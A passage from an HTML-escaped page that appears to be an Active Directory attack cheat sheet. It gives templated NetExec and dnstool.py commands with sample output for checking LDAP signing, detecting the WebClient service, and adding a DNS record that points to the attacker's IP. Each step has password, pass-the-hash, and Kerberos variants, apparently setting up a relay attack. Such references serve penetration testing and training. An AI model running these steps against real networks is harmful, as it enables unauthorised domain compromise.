Signing&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M ldap-checker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap WS01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -d example.com -M ldap-checker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    WS01          [*] Windows Server 2022 Build 20348 (name:WS01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    WS01          [+] example.com\apple.seed:Password123!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP-CHE... 10.10.72.181    389    WS01          LDAP signing NOT enforced&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP-CHE... 10.10.72.181    389    WS01          LDAPS channel binding is set to: Never&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M ldap-checker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -d giveback.htb -M ldap-checker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    WS01          [*] Windows Server 2022 Build 20348 (name:WS01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    WS01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP-CHE... 10.10.72.181    389    WS01          LDAP signing NOT enforced&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP-CHE... 10.10.72.181    389    WS01          LDAPS channel binding is set to: Never&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --kdcHost &amp;lt;DC&amp;gt; -M ldap-checker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -d giveback.htb -k --kdcHost dc01.example.com -M ldap-checker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    WS01          [*] Windows Server 2022 Build 20348 (name:WS01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    WS01          [+] example.com\apple.seed:Password123!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP-CHE... 10.10.72.181    389    WS01          LDAP signing NOT enforced&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP-CHE... 10.10.72.181    389    WS01          LDAPS channel binding is set to: Never&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --kdcHost &amp;lt;DC&amp;gt; -M ldap-checker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -d giveback.htb -k --kdcHost dc01.example.com -M ldap-checker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    WS01          [*] Windows Server 2022 Build 20348 (name:WS01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    WS01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP-CHE... 10.10.72.181    389    WS01          LDAP signing NOT enforced&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP-CHE... 10.10.72.181    389    WS01          LDAPS channel binding is set to: Never&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --use-kcache --kdcHost &amp;lt;DC&amp;gt; -M ldap-checker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc ldap dc01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -d giveback.htb -k --use-kcache --kdcHost dc01.example.com -M ldap-checker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP        10.10.72.181    389    WS01          [*] Windows Server 2022 Build 20348 (name:WS01) (domain:example.com)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP-CHE... 10.10.72.181    389    WS01          LDAP signing NOT enforced&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;LDAP-CHE... 10.10.72.181    389    WS01          LDAPS channel binding is set to: Never&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-check-webdav-status&#34;&gt;2. Check WebDAV Status&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc smb &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M webdav&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc smb WS01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -d example.com -M webdav&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc smb &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M webdav&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc smb WS01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -d example.com -M webdav&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc smb &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --kdcHost &amp;lt;DC&amp;gt; -M webdav&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc smb WS01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; -d example.com -k --kdcHost dc01.example.com -M webdav&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc smb &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -H &amp;#39;&amp;lt;HASH&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --kdcHost &amp;lt;DC&amp;gt; -M webdav&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc smb WS01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;2B576ACBE6BCFDA7294D6BD18041B8FE&amp;#39;&lt;/span&gt; -d example.com -k --kdcHost dc01.example.com -M webdav&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;nxc smb &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -k --use-kcache --kdcHost &amp;lt;DC&amp;gt; -M webdav&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; nxc smb WS01.example.com -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;apple.seed&amp;#39;&lt;/span&gt; -d example.com -k --use-kcache --kdcHost dc01.example.com -M webdav&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;WEBDAV      10.10.143.102   445    WS01             WebClient Service enabled on: 10.10.143.102&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3-add-a-dns-entry-in-trusted-zone&#34;&gt;3. Add a DNS Entry in Trusted Zone&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;python3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --action add --record &amp;lt;SUBDOMAIN&amp;gt;.&amp;lt;DOMAIN&amp;gt; --data &amp;lt;LOCAL_IP&amp;gt; &amp;lt;DC_IP&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; python3 dnstool.py -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;example.com\apple.seed&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Password123!&amp;#39;&lt;/span&gt; --action add --record test.example.com --data 10.10.14.31 10.10.143.102&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Connecting to host...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Binding to host&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Bind OK&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] Adding new record&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] LDAP operation completed successfully&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;python3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p 